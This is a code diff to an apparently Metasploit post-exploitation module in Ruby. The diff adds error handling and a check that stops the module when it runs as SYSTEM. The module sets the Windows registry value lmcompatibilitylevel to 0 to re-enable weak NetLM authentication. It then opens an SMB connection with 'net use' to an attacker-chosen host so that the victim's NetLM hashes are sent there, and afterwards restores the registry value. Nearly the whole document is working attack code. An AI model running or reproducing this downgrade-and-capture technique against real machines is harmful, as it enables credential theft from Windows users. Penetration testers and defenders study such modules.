@@ -20,6 +20,7 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Post::Windows::WindowsServices
 	include Msf::Post::Common
+	include Msf::Post::Windows::Priv
 
 	def initialize(info={})
 		super(update_info(info,
@@ -45,35 +46,62 @@ class Metasploit3 < Msf::Post
 
 	# method to make smb connection
 	def smb_connect
-		print_status("Establishing SMB connection to " + datastore['SMBHOST'])
-		cmd_exec("cmd.exe","/c net use * \\\\#{datastore['SMBHOST']}\\ipc$")
-		print_status("The SMBHOST should now have NetLM hashes")
+		begin
+			print_status("Establishing SMB connection to " + datastore['SMBHOST'])
+			cmd_exec("cmd.exe","/c net use * \\\\#{datastore['SMBHOST']}\\ipc$")
+			print_status("The SMBHOST should now have NetLM hashes")
+		rescue ::Exception => e
+			print_error("Issues establishing SMB connection")
+		end
 	end
 
 	# if netlm is disabled, enable it in the registry
 	def run
-		subkey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
-		v_name = "lmcompatibilitylevel"
-		netlm = registry_getvaldata(subkey, v_name)
-		if netlm == 0
-			print_status("NetLM is already enabled on this system")
-
-			# call smb_connect method to pass network hashes
-			smb_connect
+		# if running as SYSTEM exit
+		if is_system?
+			# running as SYSTEM and will not pass any network credentials
+			print_error "Running as SYSTEM, should be run as valid USER"
+			return
 		else
-			print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
-			registry_setvaldata(subkey,v_name,0,"REG_DWORD")
+			subkey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
+			v_name = "lmcompatibilitylevel"
+			begin
+				netlm = registry_getvaldata(subkey, v_name)
+			rescue ::Exception => e
+				print_error("Issues enumerating registry values")
+			end
 
-			post_netlm = registry_getvaldata(subkey, v_name)
-			print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")
+			if netlm == 0
+				print_status("NetLM is already enabled on this system")
 
-			# call smb_connect method to pass network hashes
-			smb_connect
+				# call smb_connect method to pass network hashes
+				smb_connect
+			else
+				begin
+					print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
+					registry_setvaldata(subkey,v_name,0,"REG_DWORD")
+				rescue ::Exception => e
+					print_error("Issues modifying registry value")
+				end
 
-			# cleanup the registry
-			registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
-			print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
+				begin
+					post_netlm = registry_getvaldata(subkey, v_name)
+					print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")
+				rescue ::Exception => e
+					print_error("Issues enumerating registry values")
+				end
+
+				# call smb_connect method to pass network hashes
+				smb_connect
+
+				# cleanup the registry
+				begin
+					registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
+					print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
+				rescue ::Exception => e
+					print_error("Issues cleaning up registry changes")
+				end
+			end
 		end
 	end
 end
-
